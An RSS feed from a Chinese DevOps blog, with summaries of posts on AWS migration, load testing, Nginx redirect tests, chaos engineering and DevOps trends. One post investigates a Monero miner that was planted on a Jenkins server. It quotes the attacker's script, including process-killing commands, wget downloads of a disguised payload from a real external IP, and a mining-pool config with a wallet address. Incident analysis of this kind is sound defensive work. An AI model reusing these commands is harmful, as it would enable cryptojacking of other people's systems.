 数据库分离的性能基线就是在同样的负载测试下，不能够比没分离之前更差。 数据库的网络建立在一个私有的子网中，除了应用子网内的 IP 不能访问数据库，从而提高安全性。 构建一个私有域名来访问数据库，这样可以固定应用的内部配置，减少对配置的修改。同时也给外部切换数据库主备等留下了更灵活的空间。 注意对原有数据库 MySQL 配置信息的复制，这会导致很大程度上的性能差异。 对于数据较大的数据库启动而言，会有一个几分钟的热身（Warm up）时间，这会导致性能下降。所以，做切换的时候提前启动数据库以做好准备。 不要用默认的 root 账户作为应用的访问账户。 由于 RDS 可以在不影响数据完整性和一致性的情况下降低使用配置，在最开始的时候采用较高的配置。随着优化的不断进行，可以采用维护时间窗口（Maintenance Time Window）在低流量时段对 RDS 实例的配置进行降级，以节约成本。  完成了数据库的隔离，我们就可以依法炮制文件的隔离了。最简单有效的方案是把文件存储在对象存储服务中。AWS S3 就是这样一种服务。避免自己构建共享文件系统或者共享存储设备。</description>
    </item>
    
    <item>
      <title>公有云(AWS)上的生产环境性能分析案例</title>
      <link>https://www.guyu.me/2018/2018-08-07-performance-analysis-case-study/</link>
      <pubDate>Tue, 07 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-08-07-performance-analysis-case-study/</guid>
      <description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的前半部分，本文对原文有所修改和总结。交流实录请点击这里。
案例背景 案例是一个泰国网站的生产环境（请脑补一句“萨瓦迪卡”，为了叙述方便，下文中均以&amp;rdquo;萨瓦迪卡&amp;rdquo;指代这个网站。）“萨瓦迪卡”是一个 采用 Wordpress + MySQL搭建的应用。这个遗留系统已经工作了五年。客户已经把在其它 VPS 上平移到 AWS 上。平移（lift and shift）是说原样复制，而迁移（migration）还要进行改造。而客户唯一发挥 AWS 优势的一点就是用了一个配置很高的 EC2 虚拟机 —— m4.4xlarge。这样一台配置的虚拟机有 16 个虚拟 CPU，64 GiB 的内存，以及 2000 Mbps 的网络带宽，最高 3000 IOPS 的 200GiB 的块存储设备（也就是硬盘）。
知识点： GiB 是用二进制计算的，GB 是用十进制计算的。1 GiB 是 2的30 次方，而1 GB 是10 的 9 次方，1 GiB 略大于 1GB。 而且，AWS 的 FreeTier 免费计划是按 GB 计算的哦！
除了基本的网络和虚拟机以外，“萨瓦迪卡” 的所有东西都放在一台虚拟机上。没错，是所有东西——Web 服务器，反向代理，数据库，上传的文件——都放在一台虚拟机上。唯一个一个负载均衡用来承载 HTTPS 证书，没有使用集群，没有高可用，没有数据库/应用分离，没有防火墙，没有 WAF，没有 APM，没有 CDN 而且，没有持续交付流水线，所有部署都要 ssh 到机器上进行操作。如图所示：</description>
    </item>
    
    <item>
      <title>一怒之下，我又写了一个开源流量测试工具</title>
      <link>https://www.guyu.me/2018/2018-07-07-why-do-i-write-wade/</link>
      <pubDate>Sat, 07 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-07-07-why-do-i-write-wade/</guid>
      <description>继一怒之下我写出了 Vivian（详见“测试驱动开发 Nginx 配置”）之后。又在等待客户审批流程的时间里自己写了一个流量测试工具。
背景 客户的站点是通过 Wordpress 搭建的，这个应用放在一台 EC2 虚拟机上。奇葩的是，这个应用的 MySQL 数据库也在这台虚拟机上，之前做过一次 RDS 迁移，失败了，原因未知。看起来这个应用和数据库就像筷子兄弟一样，不离不弃，而且没有办法通过 AutoScaling Group 进行水平扩展。也就是说，所有的东西都在一台虚拟机上。
我所要做的，就是把这个架构重新变成可自动水平扩展且高可用高性能有缓存低消耗具备监控和更加安全且有版本控制并可以通过持续交付流水线来半自动部署的架构。你可以重新读一下上一句加粗文字的内容。没错，目前他们连版本控制都没有，所有的操作在服务器上通过 mv 之间 scp 进行。
很不巧的时候，这个“筷子兄弟”应用在上周开始，晚上随机的 Down 机，表现为数据库被删。但通过日志可以发现，是由于内存资源不足导致的 MySQL 数据引擎加载不了导致的。
由于需要做“筷子兄弟”拆分手术，目的是要把数据库和应用程序分开，并且需要进行一些服务的重启和拆分。这些操作中会导致停机时间，为了能够度量这个停机时间，便于做出更好的决策，客户希望在测试环境上能够通过模拟生产环境的工作状态来完成这个任务。我设计了方案，包括以下几点：
 知道每一个可能引起停机的操作引起停机的时长。 测试 RDS 能带来多少的性能提升。 找出整个架构引起停机的根本问题。 在 500 个并发用户访问的情况下，会出现的性能拐点。 能够度量应用的资源损耗。  客户已经购买了 NewRelic 和 Flood.io （我在 17 期技术雷达里提交的条目，叉会腰。）但是 Flood.io 的账号分配需要一个额外的审批才可以使用，也就是说，我得等到第二天才能使用。
我想，也许 github 上会有这样的工具能够满足我这个简单的需求，搜了一圈，没有合适的。
于是，一怒之下，我用了大概两个小时的时间用 Python 编写了这样一个测试工具。
工具的设计  There are only two hard things in Computer Science: cache invalidation and naming things.</description>
    </item>
    
    <item>
      <title>采用 DevOps 故事落地 DevOps</title>
      <link>https://www.guyu.me/2018/2018-06-24-devops-story/</link>
      <pubDate>Sun, 24 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-06-24-devops-story/</guid>
      <description>在 2009 年第一届 DevOpsDays 上，《敏捷教练》的作者 Rachel Davies 作为第一届 DevOpsDays 上的第一位分享嘉宾。分享了在 BBC 采用用户故事跟踪非功能需求的经验。然而这一实践并不如 DevOps 的其它实践那样广泛。这个实践实际上很简单，就是把非功能需求做为用户故事的 AC 放入故事卡里。
在我过去实践 DevOps 的经历里，发现每次开始的时候都需要团队做同样的一些事情。而这些事情往往是和用户故事独立的，不能作为用户的一部分体现在工作量里。但这些事情又提升了团队之间的 DevOps 能力，于是，我把这一类的工作固化为 DevOps 故事用来落地 DevOps 实践，而且 DevOps 故事同样遵循并体现 CLAMS 原则的。
所谓 CLAMS 原则，指的是：
 Culture（文化） Lean（精益） Automated （自动化） Measurement （度量） Sharing （分享/共担责任）
 我把一个团队是否遵循 CLAMS 原则当做是否正确实践 DevOps 的标准之一。
DevOps 故事由 DevOps Epic （DevOps 史诗）和 DevOps Story （DevOps 故事）组成。和用户故事对应，DevOps 史诗故事可以依据具体情况的不同拆分成不同的 DevOps 故事。
而无论 DevOps 史诗 还是 DevOps 故事，都包含以下三个因素：
 一定包含 Dev 和 Ops 两个方面</description>
    </item>
    
    <item>
      <title>测试驱动开发 Nginx 配置</title>
      <link>https://www.guyu.me/2018/2018-06-12-tdd-in-nginx/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-06-12-tdd-in-nginx/</guid>
      <description>2017年中，我参与了一个亚太地区互联网公司并购的项目，客户收购了亚太地区 7 个国家的同行业互联网企业和产品。我作为其中的 DevOps 咨询师和 DevOps 工程师，和客户一起完成并购后的产品迁移和技术能力提升的设计、实施和培训。
客户希望采用新的统一产品，并根据不同地区的业务特色进行一些定制，与此同时，需要进行数据迁移以保证业务可以继续运行。其中一个很关键的步骤是把原系统的 URL 通过重定向的方式到新的产品中，因为有很多的第三方链接和搜索引擎依然保留了原系统中的链接。
初步统计了一下，将近有3000多个 URL 需要重定向，光是规则和正则表达式就写了 400 多条（没有统一模式的 URL 害死人啊），这就引发了一个问题：我该如何验证这些规则和覆盖这些 URL ？此外，大量的重定向不光对用户来讲不是很好的体验，如果我要优化这些规则，我如何保证我当前的转发规则不被破坏？
解决方案 最早，我们写了一个 Shell 脚本，用 curl命令来验证这些 URL，最初只需要验证 200 条就可以满足需求，时间也不到两分钟。后来，我们采用了一个 Excel 文件来跟踪这些 URL，产品经理只需要把新的重定向 URL 补充到上面，我们就依据这些 URL 来开发 nginx 的重定向规则。
这让我想到了 TDD：先写出一个自动化测试用例，然后修复这个自动化测试用例。更好的是，有了自动化的测试做保护，你可以放心和安全的对代码进行重构。
此外，随着更多的 URL 需要重定向，这个数字在不断的增加。原先的 Shell 脚本执行的时间也从最初的 2 分钟增长到了15分钟。
现有的工具满足不了要求，一怒之下，我决定开发一个自己的工具。它必须具备以下特点：
 可以通过文件读取规则，进行大批量验证。 多线程并发执行，可以提升效率。 很容易和 CI 集成。 能帮我做一定程度的重定向优化分析。  于是，我在一个周末的时间用 Python 写下了 vivian： 一个多线程的批量自动化重定向验证工具。
它把原先的 15 分钟的验证时间缩短到了 17 秒，效率提升了 5294 % !!
此外，我把测试用例集成到了代码库里。并把 vivian 提交到了 pipy，这样我就可以通过 pip 在初始化 CI 上安装了。也无需增加到代码库里变成一个需要维护的代码脚本。</description>
    </item>
    
    <item>
      <title>云原生 DevOps</title>
      <link>https://www.guyu.me/2018/2018-06-02-cloudnative-devops/</link>
      <pubDate>Sat, 02 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-06-02-cloudnative-devops/</guid>
      <description>回头遥望，DevOps 将迎来自己的十岁生日。对于整个行业，这十年 DevOps给 IT 行业所带来的冲击并没有因为时间的增长而放慢革新的脚步，反而越发的剧烈和深远。
随着大规模的互联网应用不断在云计算平台上遇到挑战，新的应用架构模式呼之欲出，在众多的实践和方法论中，CloudNative 应用则是其中的佼佼者。 CloudNative 应用结合了 DevOps 社区在互联网上的最佳实践。
然而，仅仅有了构建 CloudNative 应用的方法论是不够的。一方面，没有采用 DevOps 从组织和流程的角度优化企业的流程，仍然会出现 “DevOps 之痛”，并阻碍着互联网转型。另一方面，“经典的”企业级 DevOps 同样面临着 CloudNative 带来的新挑战。于是我们可以看到，很多具有 DevOps 基因的互联网企业开始刻意的进行敏捷和 DevOps 转型。而率先完成 敏捷和 DevOps 的企业在进行 云原生 应用改造和技术革新上带来了新的问题。
这就对 DevOps 在云原生的环境下提出了新的课题和实践诉求，我们如何在云原生的环境下实践 DevOps 以达到更有生产力的表现？
本文将从最新一期的技术雷达中，试图勾画出 DevOps 在云原生的环境下的特性、未来的趋势以及相应的实践。
背景：不断蔓延的云环境复杂性 本期技术雷达主题之一是：不断蔓延的云环境复杂性。
随着更多的云计算厂商的诞生，差异性质的服务将会越来越少。而在马太效应下，云计算平台之间也将迎来大规模的整合和重组。云计算平台之间竞争不断加剧，使得我们对云计算有了更多的选择，然而带来的是云平台之间在兼容性上的问题。我们虽然可以看到 Docker 这样的封装式解决方案，但对于整体云计算平台的编排和利用。例如网络，安全设施，服务资源间调度，却统一规范和标准。从平台的角度来看，这确实是避免客户流失的有效手段。但留给用户的选择空间不大。
因此，跨云平台的基础设施编排工具不断出现，使得用户可以在不同的云平台之间无缝切换。随之而来的将是一个云计算的标准或者事实标准将呼之欲出，加强这个市场上的马太效应，淘汰掉小的云服务厂商，或者因为技术独特而被大的厂商收购。
如果你害怕自己的数据中心被平台所绑定，则需要花费更多的成本来维护一个云平台之间兼容性的应用系统。
SecDevOps 本期技术雷达的另一个主题之一是：信任但要验证。
相对于企业级的可控网络和访问结点来说，在云原生的环境下，企业所面临的挑战则更为艰巨。这就好比你之前在自己小区的花丛里种花，你所面对的无非家猫家狗和小孩子的破坏。然后，你现在要在野生山林里种花，就要面对更加未知和复杂的环境。
然而，适应了企业级的应用开发和维护的开发团队并不如天生的互联网企业那般很快就能适应互联网的大丛林。
在 DevOps 运动刚开始的时候，安全并不是一个主要的 Topic，只是一系列需要注意的事项，于是在做 DevOps 实践的时候，把安全放在了最后考虑，即 DevOpsSec。随着 DevOps 的实践越来越激进，新的工具不断从社区涌现。安全作为 DevOps 的阻力则越来越大。但安全始终是绕不开的重要事情。因此，DevOps 社区尝试用同样的办法炮制和安全部门的合作以及安全实践，随后有了 DevSecOps，Sec 逐渐成为了 DevOps 实践中重要的一环。
就像我们之前讲的，面对复杂多变的云环境，安全要作为第一考量首先考量，而不是事后弥补。这一点就和我们在持续交付中探讨的“质量內建”一样。在云平台上实践 DevOps 要做到“安全內建”（Build Security In），这不单单是说我们增加几个自动化安全扫描的工具就足够的。要从系统的角度来重新思考安全在整个应用生命周期和团队的实践。ThoughtWorks 的安全社区在&amp;rdquo;安全內建&amp;rdquo;总结出了自己的实践，详细内容可以参考 buildsecurityin 网站。</description>
    </item>
    
    <item>
      <title>翻译-混沌工程的原则</title>
      <link>https://www.guyu.me/2018/2018-03-01-principlesofchaos-zh-cn/</link>
      <pubDate>Thu, 01 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-03-01-principlesofchaos-zh-cn/</guid>
      <description>混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。
大规模分布式软件系统的发展正在改变软件工程。作为一个行业，我们很快采用了提高开发灵活性和部署速度的实践。紧跟着这些好处的一个紧迫问题是：我们对投入生产的复杂系统中有多少信心？
即使分布式系统中的所有单个服务都正常运行, 这些服务之间的交互也会导致不可预知的结果。 这些不可预知的结果, 由影响生产环境的罕见但破坏性的真实事件复合而成，令这些分布式系统存在内在的混沌。
我们需要在异常行为出现之前，在整个系统的范围内找出这些弱点。 系统弱点包括以下形式: 当服务不可用时的不正确回退设置;不当的超时设置导致的重试风暴;由于下游依赖项流量过载导致的服务中断;单点故障时的级联失败等。我们必须主动的发现这些重要的弱点，在这些弱点通过生产环境暴露给我们的客户之前。我们需要一种方法来管理这些系统固有的混沌, 通过增加的灵活性和速率以提升我们对生产环境部署的信心, 尽管系统的复杂性是由这些部署所导致的。
基于经验和系统的方法解决了分布式系统在规模增大时引发的混乱问题, 并以此建立了对这些系统抵御现实条件的能力的信心。 我们通过在受控实验中观察分布式系统的行为来了解它的特性。 我们称之为混沌工程。
混沌工程实践 为了具体地解决分布式系统在规模上的不确定性，可以把混沌工程看作是为了揭示系统弱点而进行的实验。这些实验遵循四个步骤：
 首先，用系统在正常行为下的一些可测量的输出来定义“稳态”。 假设这个稳定状态在控制组和实验组都会继续存在。 引入反映真实世界事件的变量，如服务器崩溃、硬盘故障、网络连接断开等。 试图通过假设控制组和实验组之间的稳态差异来反驳这个假设。  破坏稳态的难度越大，我们对系统行为的信心就越强。如果发现了一个弱点，那么我们就有了一个改进目标。避免在系统规模化之后被放大。
高级原则 以下原则描述了应用混沌工程的理想方式，这些原则基于上述实验过程。 对这些原则的匹配程度能够增强我们在大规模分布式系统的信心。
建立一个围绕稳定状态行为的假说 要关注系统的可测量输出, 而不是系统的属性。 对这些输出在短时间内的度量构成了系统稳定状态的一个代理。 整个系统的吞吐量、错误率、延迟百分点等都可能是表示稳态行为的指标。 通过在实验中的系统性行为模式上的关注, 混沌工程验证了系统是否正常工作, 而不是试图验证它是如何工作的。
多样化真实世界的事件 混沌变量反映了现实世界中的事件。 我们可以通过潜在影响或估计频率排定这些事件的优先级。 考虑与硬件故障类似的事件, 如服务器宕机、软件故障 (如错误响应) 和非故障事件 (如流量激增或缩放事件)。 任何能够破坏稳态的事件都是混沌实验中的一个潜在变量。
在生产环境中运行实验 系统的行为会依据环境和流量模式都会有所不同。 由于资源使用率变化的随时可能发生, 因此通过采集实际流量是捕获请求路径的唯一可靠方法。 为了保证系统执行方式的真实性与当前部署系统的相关性, 混沌工程强烈推荐直接采用生产环境流量进行实验。
持续自动化运行实验 手动运行实验是劳动密集型的, 最终是不可持续的，所以我们要把实验自动化并持续运行。 混沌工程要在系统中构建自动化的编排和分析。
最小化爆炸半径 在生产中进行试验可能会造成不必要的客户投诉。虽然对一些短期负面影响必须有一个补偿, 但混沌工程师的责任和义务是确保这些后续影响最小化且被考虑到。
混沌工程是一个强大的实践, 它已经在世界上一些规模最大的业务系统上改变了软件是如何设计和工程化的。 相较于其他方法解决了速度和灵活性, 混沌工程专门处理这些分布式系统中的系统不确定性。 混沌工程的原则为我们大规模的创新和给予客户他们应得的高质量的体验提供了信心。
欢迎加入混沌社区的 Google 讨论组和我们一起讨论这些原则的应用。
本作品采用知识共享署名-禁止演绎 4.0 国际许可协议进行许可。</description>
    </item>
    
    <item>
      <title>从最新一期技术雷达看 DevOps 的发展</title>
      <link>https://www.guyu.me/2017/2017-12-07-devops-trends-in-tech-radar/</link>
      <pubDate>Thu, 07 Dec 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-12-07-devops-trends-in-tech-radar/</guid>
      <description>今年4月份，我第一次以主编的身份参加技术雷达的翻译工作。有幸第一时间参加到技术雷达的翻译过程中。通过我在翻译其间对条目的了解和观察，我写下了《DevOps发展的九个趋势》
今年11月份，我再一次以执行主编的身份参加第17期技术雷达的翻译工作。17 期技术雷达中两大主题：Kubernetes 和 Cloud as the New Normal 都是 DevOps 相关的。而且本期技术雷达涌现了众多 DevOps 相关的新条目。一方面说明了 DevOps 在 IT 业的重要性日渐增加，一方面也支撑起了 DevOps 社区在工具和实践上的创新。虽然每个人对 DevOps 的理解不尽相同，但能持续的着眼在具体的问题并提供实际的解决方案则是值得称道的。
这些新的变化对我上一期的 DevOps 技术趋势判断和发展有了新的思考和认识，借由此文分享给大家。
回顾2017年 DevOps 发展 在今年 4月第16期技术雷达发布后，我分析了 DevOps 发展的九个趋势。我认为这九个趋势代表了2017年 DevOps 技术的发展方向。让我们来结合最新的技术雷达回顾一下2017年这些趋势的发展。
趋势1：微服务目前仍然是DevOps技术应用和发展的主要领域 现状：微服务的相关技术仍然不断涌现。但人们似乎过于乐观的估计了微服务的投资回报速度。架构演进是一个长期的过程，而实践中的陷阱和问题越来越多。不断涌现的诸多工具和解决方案说明了微服务的反思已经开始。让我们期待更多微服务的案例出现。
趋势2：以Docker为核心的数据中心方案逐渐走向成熟 现状：Kubernetes 生态圈在 Docker 编排工具的争霸大战中笑道了最后，本期技术雷达把 Kubernetes 移动到了“采用”中，证明 Kubernetes 是经得住时间考验的工具。随着越来越多的厂商和社区开始围绕 Kubernetes 构建自己的产品，我相信基于 Kubernetes 的产品和工具会越来越多。
趋势3：不完整的DevOps实践阻碍着DevOps的发展 现状：虽然 DevOps 社区的活跃程度催生了一大批的工具和平台，但却在推广实践上发力不足。接受了局部技术改进后的 DevOps 演进似乎立刻停止，使得 DevOps 难以发挥出更大的价值。随着时间的发展，这种局面会愈来愈常见。如方法论的推广落后于工具的发展，那么 DevOps 运动的寿终正寝也将为期不远。
趋势4：领域特定的DevOps实践开始出现 现状：虽然并没有十分特别的领域特定的 DevOps 技术出现。但受到 DevOps 启发的 DesignOps 和 DevSecOps 也分别有了自己的社区群体。期待它们在未来有进一步的表现。</description>
    </item>
    
    <item>
      <title>关于 DevOps ，咱们聊的可能不是一回事</title>
      <link>https://www.guyu.me/2017/2017-12-03-we-are-talking-different-devops/</link>
      <pubDate>Sun, 03 Dec 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-12-03-we-are-talking-different-devops/</guid>
      <description>在过去的三年中，我作为 DevOps 的咨询师参与了很多企业的 DevOps 转型咨询以及技术实施，也在不同的社区活动中分享了自己在 DevOps 上的实践、理解和观点。
随着 DevOps 的盛行，我在很多场合和越来越多的人聊起 DevOps。也在不同的渠道听到了很多人在讲 DevOps。然而，讨论的背后，我发现每个人对 DevOps 所指并不是同一件事情，也由于各执一词导致不欢而散。
于是我通过 DevOpsDays 的官方网站整理所有 DevOps 的有关材料，随着学习和了解的不断增多，我也渐渐的对 DevOps 有了更进一步的认识。我把学到的材料经过整理后把陆续放在了简书上，形成了&amp;rdquo; DevOps 前世今生&amp;rdquo; 这个系列，这个系列还在不断补充新的材料。
含义越来越丰富的 DevOps DevOps 至今都缺乏一个清晰和统一的认识。对于一场运动来说，这是一件好事，也同样是一件坏事。虽然 Patrick 曾经在自己的博客里一再提到自己对 DevOps 的&amp;rdquo;正确认识&amp;rdquo;，但社区似乎不以为然。
缺乏“官方定义”好处是人人都可以定义，因此没有一个人或者组织可以垄断 DevOps 定义权。所以每个人都自己可以参与到这一运动中去，不断为其增加新的概念、新的实践和新的工具。这会使 DevOps 社区不断的繁荣。
而坏处也很明显，对于 DevOps 的后来者 —— 那些没有参与进来的人，需要学习和理解的 DevOps 知识的广度和深度也越来越大。
以至于后来出现了这幅众所周知的“盲人摸象图”：
这幅图中包含了很多概念，但主要表现的意义 DevOps 是一系列概念的总和，任何一个单方面的定义只是 DevOps 的一个部分，而不是 DevOps 的整体，随着 DevOps 这个概念的不断膨胀，人们就更难理解 DevOps 了。
那么，你理解的 DevOps 是指的什么 在接触了各类客户和社区之后，我开始尝试理解每个人谈到 DevOps 的时候，他们分别指的是什么，以及所指内容背后的目标和动机。渐渐的，我把我所听到的 DevOps 概念分成如下四类，分别是：
 DevOps 是一组技术/实践 DevOps 是一个角色 DevOps 是一种工作方式 DevOps 是一种组织结构  那么，我们分别来谈谈这四类 DevOps。</description>
    </item>
    
    <item>
      <title>你的 CI 在挖矿吗？</title>
      <link>https://www.guyu.me/2017/2017-06-28-are-your-ci-mining/</link>
      <pubDate>Wed, 28 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-06-28-are-your-ci-mining/</guid>
      <description>我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10+个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。
我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。
从一次“构建变慢“的调查说起 在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。
那么问题一定在这个服务器上！
影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。
由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。
我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。想看脚本完整源代码的请点击这里，一下是几个重要的脚本片段：
代码片段 1:
pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk &#39;{if(\$3\&amp;gt;80.0) print &amp;quot;kill -9 &amp;quot; \$2}&#39;|sh pkill bonns  我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。
conns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？
代码片段 2:
wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf  从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？
通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：
{ &amp;quot;url&amp;quot; : &amp;quot;stratum+tcp://xmr.crypto-pool.fr:3333&amp;quot;, &amp;quot;user&amp;quot; : &amp;quot;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&amp;quot;, &amp;quot;pass&amp;quot; : &amp;quot;x&amp;quot; }  stratum+tcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：
 门罗币XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。
而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。
假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。
 当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。
抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。</description>
    </item>
    
    <item>
      <title>DevOps前世今生 - DevOps 的文化</title>
      <link>https://www.guyu.me/2017/2017-05-21-devops-culture/</link>
      <pubDate>Sun, 21 May 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-05-21-devops-culture/</guid>
      <description>用工具堆砌的DevOps 幻觉 在第一届 DevOpsDays结束后，DevOps 运动则如星火燎原之势在全球发展开来。随着 DevOps 思想的不断传播，相对的质疑和批评也从未停止过。以至于到今天对于 DevOps 的定义还是众说纷纭，争论不休。
当人们还在争论 DevOps的时候，一批基于敏捷的工程实践和自动化工具带着 DevOps 的标签走入了人们的视野。人们开始认为 DevOps 就是使用这些工具进行自动化。
在早期的 DevOps 实践里，开发和运维仍然是分离的。而在很多企业中，运维部门往往是核心部门，评审应用软件的架构设计和上线要求。于是运维部门开始利用这些被称作为“DevOps”的自动化工具管理设备和应用系统。并且将自己相关的实践打赏了“DevOps”的标签传播开来。
于此同时，开发团队开始采用这些工具构建开发用的测试环境。并将运维需求带入了开发流程中，这促进了內建质量。并且利用持续集成服务器（Continous Integration Serever） 构建持续交付流水线（Continuous delivery pipeline）来可视化软件交付的进度和流程，并通过流水线完成了自动化部署。持续集成服务器连接了开发和运维！
这就是DevOps ？
“同床异梦” 的 DevOps 虽然开发团队和运维团队使用的工具变了，然而事情却没有改变：我们仍然能看到”流程结合在一起，但工作目标仍然分离“的两个团队：运维团队仍然牢牢控制着环境，控制着上线标准和上线流程。通过补充更多自动化的测试和验证手段构建更加严格的控制着变更的入口和出口。开发团队仍然不停的为了满足运维团队制定的更加严格的开发规范更加努力的学习各种工具而不断加班。
运维团队仍然不关心开发团队是否需要帮助，开发团队也依然不了解运维团队在做什么。如果没有 DevOps文化的建立，DevOps 仅仅是“通过自动化工具和手段构建的标准流程”而已。
有人甚至开始把这两个团队融合在了一起，变成了一个团队。这在一定程度上缓解了这种矛盾，但是相互指责却并没有让团队凝聚起来更加具有战斗力。而是变成了一个缓慢而争论不休的“Dev和Ops 法庭”：项目经理或者产品经理成为了法官，Dev 和 Ops 则轮番成为原告和被告。
这不是 DevOps !
早期的 DevOps文化：信任和尊重 早在 “10+ Deploys Per Day: Dev and Ops Cooperation at Flickr” 的演讲里，就总结出了 Dev 和 Ops 的合作并不能仅仅只有工具，还需要依托文化把某些行为和价值观带到组织内部。这个演讲很有洞见的总结了 Dev 和 Ops 的不同观点和思维模式，并从 Dev 和 Ops 的立场分别给出了促进合作的建议。这其中包括：
尊重：避免成见并尊重他人的经验，观点和责任。不要只是一味的拒绝改变，或者把隐藏细节。对于Dev 来说，当和 Ops 交流的时候，则应该告诉代码对 Ops 工作的影响。</description>
    </item>
    
    <item>
      <title>DevOps发展的九个趋势</title>
      <link>https://www.guyu.me/2017/2017-05-02-devops-in-tech-radar/</link>
      <pubDate>Tue, 02 May 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-05-02-devops-in-tech-radar/</guid>
      <description>DevOps 包含了太多方面的技术和实践，很难通过一个统一的工具链来描述其发展。即便如此，我们仍然可以从 ThoughtWorks 技术雷达的条目变动中看出一些趋势。今年，我有幸作为主编参与了最新一期技术雷达的翻译，作为 DevOps 的爱好者，十分高兴能在这一过程中看到 DevOps 未来发展的几个趋势，总结成了这篇文章。
趋势1：微服务目前仍然是 DevOps 技术应用和发展的主要领域 微服务将单块应用系统切割为多个简单独立的应用。从技术上说，这是通过工具把应用程序的内部复杂度转化为外部复杂度，需要一系列工具支撑微服务本身以及服务之间的通信。从组织上说，微服务团队要满足“快速发布，独立部署”的能力，则必须具备 DevOps 的工作方式。
如何拆解微服务一直是微服务技术应用的最大难点之一，领域驱动设计是比较理想的微服务拆解方法论。社会化代码分析帮助团队通过更精确的数据找到更加合适的拆分点。CodeScene是一个在线服务，它能帮助识别出热点和复杂且难以维护的子系统，通过分析分布式子系统在时间上的耦合发现子系统之间的耦合。此外，它还能帮你认识组织中的康威定律，这会大大降低微服务解耦的难度。
此外，微服务系统本质上是一个分布式系统，分布式系统之间的通信一直是很重要的问题。本期介绍的Kafka Streams和OpenTracing就是这类技术的条目。Kafka 作为一个成熟的分布式消息系统已经被广泛采用，而 Kafka Streams 则将最佳实践以“库”的方式呈现给开发人员，使得操作 Kafka 更加自然和简单。而 OpenTracing 则弥补了跨越多个微服务之间请求追踪的空白。
